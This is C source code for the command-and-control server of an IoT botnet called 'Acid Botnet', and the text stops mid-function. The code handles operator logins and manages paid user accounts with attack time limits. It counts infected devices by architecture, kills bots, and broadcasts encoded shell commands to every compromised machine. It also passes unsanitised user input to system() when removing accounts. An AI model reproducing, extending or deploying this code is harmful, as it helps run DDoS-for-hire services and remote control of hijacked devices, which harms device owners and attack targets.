#include "headers/main.h"
int EpollFD = 0, ListenFD = 0, UsersAttacks = 0, DupesDeleted = 0, ToggleAttacks = 0, toggledmotd = 0, toggledlogins = 0,
	x86_64 = 0, i686 = 0, i586 = 0, mips = 0, mipsel = 0, armv4l = 0, armv5l = 0, armv6l = 0, armv7l = 0, unknown = 0, fakebots = 0, 
	totalattacks = 0;
char broadcastmsg[500];
void *TitleWriter(void *sock)
{
	int datafd = (intptr_t)sock;
	while (managements[datafd].connected == 1)
	{
		switch (Title[datafd].status)
		{
		case 1:
			sendfd(datafd, "%c]0;Welcome to Acid Botnet %c", '\033', '\007');
			break;
		case 2:
			sendfd(datafd, "%c]0;Captcha %c", '\033', '\007');
			break;
		case 3:
			sendfd(datafd, "%c]0;Login %c", '\033', '\007');
			break;
		case 4:
			sendfd(datafd, "%c]0;Agreement %c", '\033', '\007');
			break;
		case 5:
			sendfd(datafd, "%c]0;Infected: [%d] - Clients: [%d] - Attacks: [%d] - Running: [%d] %c", '\033', BotsConnected() + fakebots, UsersConned(), totalattacks, runningattacks, '\007');
			break;
		case 6:
			sendfd(datafd, "%c]0;Failed %c", '\033', '\007');
			break;
		case 7:
			sendfd(datafd, "%c]0;%s %c", '\033', broadcastmsg, '\007');
		}
		usleep(750000);
	}
	return 0;
}
void *BotWorker(void *sock)
{
	int datafd = (intptr_t)sock, find_line, SuccessfulLogin = 1;
	managements[datafd].connected = 1;
	pthread_t title;
	pthread_create(&title, NULL, &TitleWriter, sock);
	Title[datafd].status = 1;
	fdgets(buf[datafd].buffer, sizeof buf[datafd].buffer, datafd);
	if (strstr(buf[datafd].buffer, "!login") == NULL)
		goto end;
	sendfd(datafd, "\e[2J\e[3J\e[H");
	if (toggledlogins != 0)
	{
		Title[datafd].status = 6;
		sendfd(datafd, "\e[37mLogins Are Disabled\e[38;5;122m,\e[37m Try Again Later\e[38;5;122m!\r\n");
		sleep(3);
		goto end;
	}
	Title[datafd].status = 2;
	char captcha1[90], captcha2[90];
	srand(time(NULL) ^ getpid());
	sprintf(captcha1, "%d", (rand() % 10) + 10);
	sprintf(captcha2, "%d", (rand() % 10) + 10);
	sendfd(datafd, "\e[38;5;122m╔══════════════════════════════════════════════════╗\r\n║\e[37m Enter The Captcha To Get Access To Urmoms Botnet\e[38;5;122m ║\r\n╚══════════════════════════════════════════════════╝\r\n\e[38;5;122m╔═════════════╗\r\n║\e[37m %s\e[38;5;122m +\e[37m %s\e[38;5;122m:    \e[38;5;122m║\r\n╚═════════════╝\e[37m\e[5;12H", captcha1, captcha2);
	memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
	fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
	if (strcasecmp(buf[datafd].buffer, "SK"))
	{
		if (atoi(buf[datafd].buffer) != atoi(captcha1) + atoi(captcha2))
		{
			Title[datafd].status = 6;
			sendfd(datafd, "\r\n\e[37mInvalid Captcha\e[38;5;122m!\r\n");
			SendLog(datafd, "logs/FailedLogin.log", "%s Failed The captcha.\r\n", iplog);
			sleep(3);
			goto end;
		}
	}
	Accounts_Reload();
	Title[datafd].status = 3;
	char username[30], password[30];
	sendfd(datafd, "\e[2J\e[3J\e[H\e[38;5;122m╔════════════════════════════╗\r\n║ \e[37mUsername\e[38;5;122m:                  ║\r\n╚════════════════════════════╝\e[37m\e[2;13H");
	fdgets(buf[datafd].buffer, sizeof buf[datafd].buffer, datafd);
	strcpy(username, buf[datafd].buffer);
	memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
	find_line = Find_Login(username);
	if (strcmp(username, accounts[find_line].username))
	{
		Title[datafd].status = 6;
		SendLog(datafd, "logs/FailedLogin.log", "%s:%s Failed To Login.\r\n", username, iplog);
		sendfd(datafd, "\r\n\e[37mInvalid Username\e[38;5;122m!\r\n");
		sleep(3);
		goto end;
	}
	memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
	sendfd(datafd, "\r\n\e[38;5;122m╔════════════════════════════╗\r\n║ \e[37mPassword\e[38;5;122m:                  ║\r\n╚════════════════════════════╝\e[37m\e[5;13H");
	fdgets(buf[datafd].buffer, sizeof buf[datafd].buffer, datafd);
	strcpy(password, buf[datafd].buffer);
	if (strcmp(buf[datafd].buffer, accounts[find_line].password))
	{
		Title[datafd].status = 6;
		SendLog(datafd, "logs/FailedLogin.log", "%s:%s:%s Failed There Password.\r\n", username, password, iplog);
		sendfd(datafd, "\r\n\e[37mInvalid Password\e[38;5;122m!\r\n");
		sleep(3);
		goto end;
	}
	if (!strcmp(username, password))
	{
		Title[datafd].status = 6;
		sendfd(datafd, "\r\n\e[37mYour Account Has The Same Username And Password\e[38;5;122m,\e[37m Please Change Your Info\e[38;5;122m!\r\n");
		sleep(3);
		goto end;
	}
	Title[datafd].status = 4;
	sendfd(datafd, "\e[2J\e[3J\e[H\e[38;5;122m╔═════════════════╗\r\n║ \e[37mmпредупреждение\e[38;5;122m ╚═════════════════════════╗\r\n║\e[37m All Risks Are On You\e[38;5;122m,\e[37m Do You Agree y\e[38;5;122m/\e[37mn\e[38;5;122m:   ║\r\n╚═══════════════════════════════════════════╝\e[37m\e[3;43H");
	fdgets(buf[datafd].buffer, sizeof buf[datafd].buffer, datafd);
	char agree[30];
	strcpy(agree, buf[datafd].buffer);
	if (strcasestr(agree, "Y") || strcasestr(agree, "YES"))
	{
		SendLog(datafd, "logs/Tos.log", "%s: Has Agreed To Tos.\r\n", accounts[find_line].username);
		SuccessfulLogin = 2;
	}
	else
	{
		Title[datafd].status = 6;
		sendfd(datafd, "\r\n\e[37mYou Did Not Agree\e[38;5;122m!\r\n");
		SendLog(datafd, "logs/Tos.log", "%s:%s Has Failed Tos.\r\n", accounts[find_line].username, iplog);
		sleep(3);
		goto end;
	}
	if (SuccessfulLogin == 2)
	{
		Title[datafd].status = 5;
		strcpy(managements[datafd].username, accounts[find_line].username);
		strcpy(managements[datafd].password, accounts[find_line].password);
		strcpy(managements[datafd].id, accounts[find_line].id);
		managements[datafd].maxtime = accounts[find_line].maxtime;
		managements[datafd].cooldown = accounts[find_line].cooldown;
		strcpy(managements[datafd].expiry, accounts[find_line].expiry);
		strcpy(managements[datafd].expiry, accounts[find_line].expiry);
		sprintf(managements[datafd].my_ip, "%s", iplog);
		if (!strcasecmp(managements[datafd].id, "OWNER"))
			managements[datafd].OwnerStatus = 1, managements[datafd].AdminStatus = 1;
		else if (!strcasecmp(managements[datafd].id, "ADMIN"))
			managements[datafd].AdminStatus = 1;
		else if (!strcasecmp(managements[datafd].id, "ARCHES"))
			managements[datafd].ArchStatus = 1;
		else if(!strcasecmp(managements[datafd].id, "FREE"))
			managements[datafd].FreeStatus = 1;
		SendLog(datafd, "logs/SuccessfulLogin.log", "%s:%s Has Successfully Logged In.\r\n", managements[datafd].username, managements[datafd].my_ip);
		sendfd(datafd, "\e[2J\e[3J\e[H");
		if (toggledmotd != 0)
		{
			if (strlen(motd) > 1)
			{
				sendfd(datafd, "\e[37mMotd\e[38;5;122m:\e[37m %s\r\n", motd);
			}
		}
		sendfile(datafd, "config/banners/banner.txt");
		goto WhileEnd;
		while (memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer)) && fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd) > 0)
		{
			if (strlen(buf[datafd].buffer) >= 128)
			{
				sendfd(datafd, "\e[2J\e[3J\e[H\e[37mbuffer Maxed Out\e[38;5;122m.");
				SendLog(datafd, "logs/Crash.log", "%s: Has Tried To Crash The CNC With Max buffer!\r\n", managements[datafd].username);
				sleep(3);
				goto end;
			}
			else if (!strcasecmp(buf[datafd].buffer, "HELP"))
				sendfile(datafd, "config/banners/help.txt");
			else if (!strcasecmp(buf[datafd].buffer, "?"))
			{
				if (!ToggleAttacks)
					sendfile(datafd, "config/banners/methods.txt");
				else
					sendfd(datafd, "\e[3J\e[37mAttacks Are Disabled\e[38;5;122m!\r\n");
			}
			else if (!strcasecmp(buf[datafd].buffer, "BOTS"))
			{
				if (BotsConnected() < 1)
					sendfd(datafd, "\e[2J\e[3J\e[H\e[37mNo Devices Are Conneted\e[38;5;122m.\r\n");
				else
					sendfd(datafd, "\e[2J\e[3J\e[H\e[37mConnections\e[38;5;122m:\e[37m [\e[38;5;122m%d\e[37m]\r\n", BotsConnected());
			}
			else if (!strcasecmp(buf[datafd].buffer, "BROADCAST"))
			{
				if (managements[datafd].AdminStatus)
				{
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					sendfd(datafd, "\e[3J\e[37mEnter the broadcast msg\e[38;5;122m:\e[37m ");
					fdgets(buf[datafd].buffer, sizeof buf[datafd].buffer, datafd);
					if(strlen(buf[datafd].buffer) < 1 || strlen(buf[datafd].buffer) > 50)
					{
						sendfd(datafd, "\e[3J\e[37mBad Message\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					sprintf(broadcastmsg, "%s", buf[datafd].buffer);
					for (int i = 0; i < MAXFDS; i++)
						Title[i].status = 7;
					sendfd(datafd, "\e[3J\e[37mMessage Broadasted\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Admin.log", "User: %s Broadcasted: %s\r\n", managements[datafd].username, buf[datafd].buffer);
				}
				else
				{	
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "%s: Has Tried To Broacast A Message But They Arent Admin\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "BROADCASTOFF"))
			{
				if (managements[datafd].AdminStatus)
				{
					for (int i = 0; i < MAXFDS; i++)
						Title[i].status = 5;
					sendfd(datafd, "\e[3J\e[37mTurned off broadcast\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Admin.log", "User: %s Turned Off Broadcast\r\n", managements[datafd].username);
				}
				else
				{	
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "%s: Has Tried To Turn Off The Broadcast Message But They Arent Admin\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "KILL"))
			{
				if (managements[datafd].OwnerStatus)
				{
					int found = 0, i = 0;
					char ip[128];
					sendfd(datafd, "\e[3J\e[37mEnter a host\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					for(i = 0; i < MAXFDS; i++)
					{
						if(clients[i].connected)
						{
							sprintf(ip, "%d.%d.%d.%d", clients[i].ip & 255, clients[i].ip >> 8 & 255, clients[i].ip >> 16 & 255, clients[i].ip >> 24 & 255);
							if(!strcmp(ip, buf[datafd].buffer))
							{
								send(i, "botkill\r\n", strlen("botkill\r\n"), MSG_NOSIGNAL);
								sendfd(datafd, "\e[3J\e[37mKilled Connection on host\e[38;5;122m:\e[37m %s\r\n", ip);
								found = 0;
							}
						}
					}
					if(!found)
						sendfd(datafd, "\e[3J\e[37mHost wasnt found\e[38;5;122m:\e[37m %s\r\n", buf[datafd].buffer);
					else
						SendLog(datafd, "logs/Admin.log", "User: %s Killed A Connection On Host: %s\r\n", managements[datafd].username, ip);
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent A Owner\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "User: %s Tried To Kill A Bot\r\n", managements[datafd].AdminStatus);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "KILLARCH"))
			{
				if (managements[datafd].OwnerStatus)
				{
					int found = 0, i = 0, bots = 0;
					char ip[128];
					sendfd(datafd, "\e[3J\e[37mEnter a arch\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					for(i = 0; i < MAXFDS; i++)
					{
						if(clients[i].connected)
						{
							if(strstr(clients[i].arch, buf[datafd].buffer)) {
								bots++;
								send(i, "botkill\r\n", 9, 0);
							}
						}
					}
					if(bots > 0) {
						SendLog(datafd, "logs/Admin.log", "User: %s Killed An Arch: %s\r\n", managements[datafd].username, buf[datafd].buffer);
						sendfd(datafd, "\e[3J\e[37mKilled \e[38;5;122m%d\e[37m bots\r\n", bots);
					}
					else
						sendfd(datafd, "\e[3J\e[37mNo bots with arch\e[38;5;122m: \e[37m%s\r\n", bots, buf[datafd].buffer);
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent A Owner\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "User: %s Tried To Kill An Arch\r\n", managements[datafd].AdminStatus);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "OWNER"))
			{
				if (managements[datafd].OwnerStatus)
					sendfile(datafd, "config/banners/owner.txt");
				else
					sendfd(datafd, "\e[3J\e[37mYou Arent A Owner\e[38;5;122m!\r\n");
			}
			else if (!strcasecmp(buf[datafd].buffer, "ARCHES"))
			{
				if (managements[datafd].AdminStatus || managements[datafd].ArchStatus)
				{
					if (BotsConnected() < 1)
						sendfd(datafd, "\e[2J\e[3J\e[H\e[37mNo Devices Are Conneted\e[38;5;122m.\r\n");
					else
					{
						filter_arch();
						sendfd(datafd, "\e[2J\e[3J\e[H\e[3J\e[37mCalculating arches\e[38;5;122m...\r\n");
						
						Arch *head = arch_head;

						while(head != NULL) {
							sendfd(datafd, "\e[3J\e[37m%s\e[38;5;122m:\e[37m %d\r\n", head->arch, head->bots);

							head = head->next;
						}

						sendfd(datafd, "\e[3J\e[37mTotal\e[38;5;122m:\e[37m %d\r\n", BotsConnected());
					}
				}
			}
			else if(!strcasecmp(buf[datafd].buffer, "EXIT"))
			{
				sendfd(datafd, "\e[3J\e[37mGoodbye %s\e[38;5;122m!\r\n", managements[datafd].username);
				sleep(2);
				goto end;
			}
			else if(!strcasecmp(buf[datafd].buffer, "HOME"))
			{
				sendfd(datafd, "\e[2J\e[3J\e[H");
				sendfile(datafd, "config/banners/banner.txt");
			}
			else if (!strcasecmp(buf[datafd].buffer, "DUPESDELETED"))
			{
				if (managements[datafd].AdminStatus)
				{
					if (DupesDeleted == 0)
						sendfd(datafd, "\e[2J\e[3J\e[H\e[37mThere Are No Dupes Deleted\e[38;5;122m.\r\n");
					else
						sendfd(datafd, "\e[2J\e[3J\e[H\e[37mDupes Deleted\e[38;5;122m:\e[37m %d\r\n", DupesDeleted);
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "%s: Has Tried To See Dupes Deleted Without Being a Admin.\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "INFO"))
				sendfd(datafd, "\e[2J\e[3J\e[H\e[37mAcid Account Info\e[38;5;122m.\r\n\e[37mUsername\e[38;5;122m:\e[37m %s\r\n\e[37mPlan\e[38;5;122m:\e[37m %s\r\n\e[37mMaxTime\e[38;5;122m:\e[37m %d\r\n\e[37mCoolDown\e[38;5;122m:\e[37m %d\r\n\e[37mExpiry\e[38;5;122m:\e[37m %s\r\n\e[37mIp Address\e[38;5;122m:\e[37m %s\r\n", managements[datafd].username, managements[datafd].id, managements[datafd].maxtime, managements[datafd].cooldown, managements[datafd].expiry, managements[datafd].my_ip);
			else if (!strcasecmp(buf[datafd].buffer, "ADMIN"))
			{
				if(managements[datafd].AdminStatus)
					sendfile(datafd, "config/banners/admin.txt");
				else
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
			}
			else if (!strcasecmp(buf[datafd].buffer, "ADDUSER"))
			{
				if (managements[datafd].AdminStatus)
				{
					char username[80], password[80], id[80], MaxTime[80], CoolDown[80], expiry[80], yn[80];
					sendfd(datafd, "\e[3J\e[37mUsername\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid Username\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(username, buf[datafd].buffer);
					int k;
					for (k = 0; k < 100; k++)
					{
						if (!strcmp(username, accounts[k].username))
						{
							sendfd(datafd, "\e[3J\e[37mThis Username Is Already In Use\e[38;5;122m!\r\n");
							goto WhileEnd;
						}
					}
					sendfd(datafd, "\e[3J\e[37mPassword\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid Password\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(password, buf[datafd].buffer);
					if (strcmp(username, password) == 0)
					{
						sendfd(datafd, "\e[3J\e[37mYou Cant Use The Same Username And Password\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					sendfd(datafd, "\e[3J\e[37mId common\e[38;5;122m/\e[37mfree\e[38;5;122m/\e[37marches\e[38;5;122m/\e[37madmin\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid Id\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					if (!strcmp(buf[datafd].buffer, "common") || !strcmp(buf[datafd].buffer, "admin") || !strcmp(buf[datafd].buffer, "free") || !strcmp(buf[datafd].buffer, "arches"))
					{
						strcpy(id, buf[datafd].buffer);
					}
					else
					{
						sendfd(datafd, "\e[3J\e[37mInvalid Id\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					sendfd(datafd, "\e[3J\e[37mMaxTime\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid MaxTime\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(MaxTime, buf[datafd].buffer);
					sendfd(datafd, "\e[3J\e[37mCoolDown\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					if (fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd) < 1)
						goto end;
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid CoolDown\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(CoolDown, buf[datafd].buffer);
					sendfd(datafd, "\e[3J\e[37mExpiry\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					if (fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd) < 1)
						goto end;
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid Expiry\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(expiry, buf[datafd].buffer);
					sendfd(datafd, "\e[3J\e[37mAre You Sure y\e[38;5;122m/\e[37mn\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					if (fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd) < 1)
						goto end;
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mAccount Was Not Created\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(yn, buf[datafd].buffer);
					if (strcasestr(yn, "Y") || strcasestr(yn, "YES"))
					{

						SendLog(datafd, "login/Login.txt", "%s %s %s %s %s %s\r\n", username, password, id, MaxTime, CoolDown, expiry);
						SendLog(datafd, "logs/Admin.log", "%s: Has Added User: %s To The Net!\r\n", managements[datafd].username, username);
						sendfd(datafd, "\e[3J\e[37mAccount Has Been Successfully Added\e[38;5;122m.\r\n\e[38;5;122m(\e[37mPlease Re Login\e[38;5;122m)\r\n");
						sleep(3);
						goto end;
					}
					else
					{
						sendfd(datafd, "\e[3J\e[37mAccount Was Not Created\e[38;5;122m!\r\n");
					}
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "%s: Has Tried To Add A User Without Being a Admin.\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "KICKUSER"))
			{
				if(managements[datafd].AdminStatus)
				{
					int g;
					sendfd(datafd, "\e[3J\e[37mUser To Kick\e[38;5;122m:\e[37m ");
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 16 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid User\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					for (g = 0; g < MAXFDS; g++)
					{
						if (!strcmp(managements[g].username, buf[datafd].buffer))
						{
							close(g);
							DelFD(g);
							sendfd(datafd, "\e[3J\e[37mSuccessfully kicked user out of the c2\r\n");
							SendLog(datafd, "logs/Admin.log", "User: %s kicked %s from the c2\r\n", managements[datafd].username, managements[g].username);
							break;
						}
					}
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "User: %s Tried To Kick Someone From The c2\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "SKIDS"))
				sendfile(datafd, "config/banners/skids.txt");
			else if (!strcasecmp(buf[datafd].buffer, "REMUSER"))
			{
				if (managements[datafd].AdminStatus)
				{
					char username[120], yn[80], cmd[512];
					sendfd(datafd, "\e[3J\e[37mUsername\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					if (fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd) < 1)
						goto end;
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid Username\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(username, buf[datafd].buffer);
					if (!strcmp(managements[datafd].username, username))
					{
						sendfd(datafd, "\e[3J\e[37mYou Cant Remove Yourself\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					sendfd(datafd, "\e[3J\e[37mAre You Sure y\e[38;5;122m/\e[37mn\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					if (fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd) < 1)
						goto end;
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mAccount Was Not Removed\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					for (int i = 0; i < MAXFDS; i++)
					{
						if (!strcmp(username, managements[i].username))
						{
							if (managements[i].OwnerStatus)
							{
								sendfd(datafd, "\e[3J\e[37mAccount Was Not Removed You Cant Remove A Owner\e[38;5;122m!\r\n");
								SendLog(datafd, "Admin.log", "User: %s Tried To Remove: %s But They Are A Owner\r\n", managements[datafd].username, managements[i].username);
							}
						}
					}
					strcpy(yn, buf[datafd].buffer);
					if (strcasestr(yn, "Y") || strcasestr(yn, "YES"))
					{
						int k;
						k = Find_Login(username);
						if (strcmp(username, accounts[k].username) == 0)
						{
							sprintf(cmd, "sed '/\\<%s\\>/d' -i login/Login.txt", username);
							system(cmd);
							sendfd(datafd, "\e[3J\e[37mUser Has Been Successfully Deleted\e[38;5;122m.\r\n\e[38;5;122m(\e[37mPlease Re Login\e[38;5;122m)\r\n");
							SendLog(datafd, "logs/Admin.log", "%s: Has Remv Acc: %s From The Net!\r\n", managements[datafd].username, username);
							sleep(3);
							goto end;
						}
					}
					else
					{
						sendfd(datafd, "\e[3J\e[37mAccount Was Not Removed\e[38;5;122m!\r\n");
					}
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "%s: Has Tried To Remove A User Without Being a Admin.\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "ONLINE"))
			{
				if (managements[datafd].AdminStatus)
				{
					sendfd(datafd, "\e[2J\e[3J\e[H\e[37mActive Users\e[38;5;122m.\r\n");
					int online;
					for (online = 0; online < MAXFDS; online++)
					{
						if (strlen(managements[online].username) > 1 && managements[online].connected)
							sendfd(datafd, "\e[3J\e[37mUser\e[38;5;122m:\e[37m %s | Ip\e[38;5;122m:\e[37m %s\r\n", managements[online].username, managements[online].my_ip);
					}
					sendfd(datafd, "\e[3J\e[37mTotal Users Online\e[38;5;122m:\e[37m %d\r\n", UsersConned());
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "%s: Has Tried To See Users Online!\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "TOGGLEATTACKS"))
			{
				if (managements[datafd].AdminStatus)
				{
					if (ToggleAttacks == 0)
					{
						ToggleAttacks++;
						sendfd(datafd, "\e[3J\e[37mAttacks Have Been Disabled\e[38;5;122m!\r\n");
						SendLog(datafd, "logs/Admin.log", "%s: Has Toggled Attacks off.\r\n", managements[datafd].username);
					}
					else
					{
						ToggleAttacks--;
						sendfd(datafd, "\e[3J\e[37mAttacks Have Been Enabled\e[38;5;122m!\r\n");
						SendLog(datafd, "logs/Admin.log", "%s: Has Toggled Attacks On.\r\n", managements[datafd].username);
					}
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "%s: Has Tried To On Toggle Attacks But Is Not A Admin.\r\n", managements[datafd].username);
				}
			}
			else if (strcasestr(buf[datafd].buffer, "SHELL"))
			{
				if (managements[datafd].OwnerStatus)
				{
					char *encoded = encode(buf[datafd].buffer);
					broadcast(encoded);
					SendLog(datafd, "logs/Admin.log", "User: %s sent %s to bots\r\n", managements[datafd].username, buf[datafd].buffer);
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent A Owner\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "User: %s Tried To Run A Shell Command\r\n", managements[datafd].AdminStatus);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "MOTDOFF"))
			{
				if (managements[datafd].AdminStatus)
				{
					if (toggledmotd != 0)
					{
						toggledmotd = 0;
						sendfd(datafd, "\e[3J\e[37mMotd Has Been Turned Off\e[38;5;122m.\r\n");
						SendLog(datafd, "logs/Admin.log", "%s: Has Turned Off Motd.\r\n", managements[datafd].username);
					}
					else
					{
						sendfd(datafd, "\e[3J\e[37mThere Currently Is No Motd\e[38;5;122m.\r\n");
					}
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Server.log", "%s: Has Tried To Change The Motd!\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "MOTD"))
			{
				if (managements[datafd].AdminStatus)
				{
					sendfd(datafd, "\e[3J\e[37mMotd\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mInvalid Motd\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(motd, buf[datafd].buffer);
					sendfd(datafd, "\e[3J\e[37mMotd Has Been Successfully Updated\e[38;5;122m.\r\n");
					SendLog(datafd, "logs/Admin.log", "%s: Has Changed The Motd.\r\n", managements[datafd].username);
					toggledmotd++;
				}
				else
				{
					sendfd(datafd, "\e[3J\e[37mYou Arent Admin\e[38;5;122m!\r\n");
					SendLog(datafd, "logs/Admin.log", "%s: Has Tried To Change The Motd!\r\n", managements[datafd].username);
				}
			}
			else if (!strcasecmp(buf[datafd].buffer, "PASSWD"))
			{
				if(managements[datafd].FreeStatus != 1) {
					char newpassword[80], yn[80], cmd[512];
					sendfd(datafd, "\e[3J\e[37mCurrent Password\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
					if (strlen(buf[datafd].buffer) > 20 || strlen(buf[datafd].buffer) < 1)
					{
						sendfd(datafd, "\e[3J\e[37mPasswords Did Not Match\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					strcpy(password, buf[datafd].buffer);
					if (strcmp(password, managements[datafd].password))
					{
						sendfd(datafd, "\e[3J\e[37mPasswords Did Not Match\e[38;5;122m!\r\n");
						goto WhileEnd;
					}
					sendfd(datafd, "\e[37mNew Password\e[38;5;122m:\e[37m ");
					memset(buf[datafd].buffer, 0, sizeof(buf[datafd].buffer));
					fdgets(buf[datafd].buffer, sizeof(buf[datafd].buffer), datafd);
